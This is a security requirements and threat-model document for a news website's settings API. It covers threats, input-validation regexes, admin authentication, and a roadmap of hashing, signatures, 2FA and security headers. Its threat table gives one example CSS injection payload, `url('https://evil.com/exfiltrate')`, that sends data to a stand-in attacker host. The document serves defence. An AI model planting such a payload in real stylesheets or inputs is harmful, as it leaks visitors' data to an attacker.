# Security Requirements & Architecture Assessment

## 1. Executive Summary
This document defines the security standards, threat model, input validation rules, and authorization controls for **PublicSpark News Web** in compliance with OWASP Top 10 guidelines and project safety rules.

## 2. Threat Modeling & Attack Surfaces

| Threat ID | Threat Category | Description | Potential Impact | Severity | Implemented Defense |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **TH-01** | **Client-Side Request Tampering** | Attackers craft arbitrary HTTP POST requests from browser DevTools to `/api/settings/theme` or `/api/settings/typography`. | Malicious payloads, CSS injection, layout deformation, or system corruption. | High | Strict Whitelist Key Filtering + Safe HEX/RGBA Regex Validation. |
| **TH-02** | **CSS Injection & Stored XSS** | Malicious CSS strings (e.g., `url('https://evil.com/exfiltrate')` or breakout characters `; < >`) injected into color variables. | Data exfiltration, session hijacking, or defacement. | High | Regex validation rejecting any quotes, semicolons, script tags, or unapproved characters. |
| **TH-03** | **Denial of Service (DoS / Resource Flooding)** | Attackers transmit mega-sized JSON payloads (e.g. 100MB+) to overload server RAM and fill disk storage (`settings.json`). | Node.js Event Loop lockup, out-of-memory crash, server downtime. | High | Hard 10 KB Payload Size Limit with immediate stream destruction (`413 Payload Too Large`). |
| **TH-04** | **Broken Access Control (Unauthorized Mutation)** | Non-admin visitors attempt to alter global branding, social links, or typography. | Unauthorized site-wide modification of public news appearance. | Critical | Admin Authentication Header (`x-admin-key` / `Authorization: Bearer`) + Origin Verification. |

---

## 3. Strict Input Validation Specifications

### 3.1 Color Theme Endpoint (`POST /api/settings/theme`)
1. **Allowed Keys Whitelist**:
   - `primary`
   - `bgPrimary`
   - `bgSurface`
   - `bgSecondary`
   - `textMain`
   - `textMuted`
   - `textSubtle`
   - `accentCrimson`
   - `accentBlue`
   - `borderLight`
   - `borderMedium`
   *(Any key outside this list is immediately stripped.)*

2. **Format Constraints**:
   - Every value must match `SAFE_HEX_REGEX`: `/^#([A-Fa-f0-9]{3}|[A-Fa-f0-9]{6}|[A-Fa-f0-9]{8})$/`
   - OR safe `SAFE_RGBA_REGEX`: `/^rgba?\(\s*(\d{1,3})\s*,\s*(\d{1,3})\s*,\s*(\d{1,3})\s*(?:,\s*(0|1|0?\.\d+))?\s*\)$/`
   - Values containing `;`, `<`, `>`, or quotes are rejected with `400 Bad Request`.

### 3.2 Typography Endpoint (`POST /api/settings/typography`)
1. **Allowed Keys Whitelist**:
   - `headingFont`: String (max 64 characters, letters, spaces, hyphens only).
   - `bodyFont`: String (max 64 characters, letters, spaces, hyphens only).
   - `headingScale`: Integer between `70` and `160`.
   - `bodySize`: Integer between `12` and `24`.
   - `regionalFonts`: Validated dictionary of language codes mapping strictly to validated font strings.

---

## 4. Authentication & Authorization Controls

- **Admin Secret Key**: Configurable via `ADMIN_API_SECRET` environment variable (with fallback for local sandboxes).
- **Header Protocol**:
  - `x-admin-key: <SECRET>` OR `Authorization: Bearer <SECRET>`
- **Behavior**:
  - If a request lacks credentials and originates from outside verified origins, return `403 Forbidden`.
  - Sensitive administrative routes are isolated from public readership endpoints.

---

## 5. Security Verification Status

- [x] Input sanitization implemented in `server/server.js`
- [x] Payload size limit enforced (10 KB ceiling)
- [x] Regex validation on all incoming color values
- [x] Admin authorization headers wired in frontend services
- [x] Tested with adversarial payloads (script tags, oversized strings, invalid hex)

---

## 6. Advanced International Cybersecurity & Hashing Blueprint (Dedicated Security Phase)

> [!NOTE]
> **Roadmap Note**: As per user directive, this comprehensive blueprint is cataloged here for deep research and phased execution once primary functional feature work is completed.

### 6.1 The 3-Tier Cryptographic Hashing Architecture
1. **Tier A: Memory-Hard Password & PIN Hashing (`scrypt` / `Argon2id`)**
   - **Threat Defeated**: GPU / ASIC accelerated password cracking (Rainbow tables & brute force).
   - **Implementation**: Node.js native `crypto.scryptSync(password, salt, 64, { N: 16384, r: 8, p: 1 })` with a unique 32-byte cryptographically secure pseudorandom salt (`crypto.randomBytes(32)`).
   - **Advantage**: Requires 32MB–64MB RAM per hash, rendering massive parallel GPU cracking mathematically infeasible while keeping legitimate login latency under 50ms. Zero cost, native C++ OpenSSL engine.

2. **Tier B: Article Anti-Defacement & Tamper-Evident Signatures (`HMAC-SHA256`)**
   - **Threat Defeated**: Direct database tampering, unauthorized headline alteration, or rogue database manipulation.
   - **Implementation**:
     ```js
     signature = crypto.createHmac('sha256', SERVER_MASTER_SECRET)
                       .update(article.id + article.title + article.content + article.author)
                       .digest('hex');
     ```
   - **Verification**: On every reader SSR request and API fetch, the signature is validated against the computed hash. If a single character or comma has been altered, the signature fails, the article is quarantined into read-only freeze, and a high-priority alert is issued to the Admin.

3. **Tier C: Tamper-Evident Audit Ledger (`Hash-Chain / Mini-Blockchain`)**
   - **Threat Defeated**: Log tampering, history wiping, or insider cover-up by rogue accounts.
   - **Implementation**: Every administrative action (login, status update, ad edit, delete) is appended to a ledger where:
     `current_hash = SHA256(previous_hash + timestamp + user_id + action + payload)`
   - **Verification**: If any historical log entry is modified or deleted, the hash chain breaks from that point forward, immediately alerting the system to an integrity breach.

---

### 6.2 The 6-Layer Hardcore Newsroom Defense Suite
1. **Layer 1: RFC 6238 Time-Based One-Time Password (TOTP 2FA)**
   - Zero password-only logins for Admin & Senior Editor.
   - Compatible with Google Authenticator, Microsoft Authenticator, and Aegis via native TOTP math (RFC 6238).
2. **Layer 2: Honeypot Traps & Automated Bot Blacklisting**
   - Hidden decoy routes (`/admin-login-v2`, `/api/backup-dump`) and invisible CSS form fields.
   - Automated IP blacklisting with 0 human interaction on tripwire activation.
3. **Layer 3: Binary Magic-Byte File Inspection**
   - Rejects uploaded files based on true binary header signatures (e.g. `RIFF...WEBP`, `\xFF\xD8\xFF` for JPEG) rather than file extensions, eliminating disguised PHP/executable uploads.
4. **Layer 4: Zero-Trust Role-Based Access Control (RBAC)**
   - Strict separation: Reporter (Draft & Submit only) vs Editor (Verify, Edit, Schedule) vs Admin (Theme, Ads, Core Settings).
   - Secured via `HttpOnly`, `SameSite=Strict`, `Secure` cryptographic session cookies immune to client-side XSS exfiltration.
5. **Layer 5: Enterprise HTTP Security Headers**
   - Strict `Content-Security-Policy (CSP)`, `X-Frame-Options: DENY` (anti-clickjacking), and `X-Content-Type-Options: nosniff`.
6. **Layer 6: Emergency "Air-Gap / Lockdown" Circuit Breaker (The Red Panic Button)**
   - 1-click immediate session termination for all active users, freezing all write operations into static read-only cache, unlockable only via an offline physical Master Recovery Key.
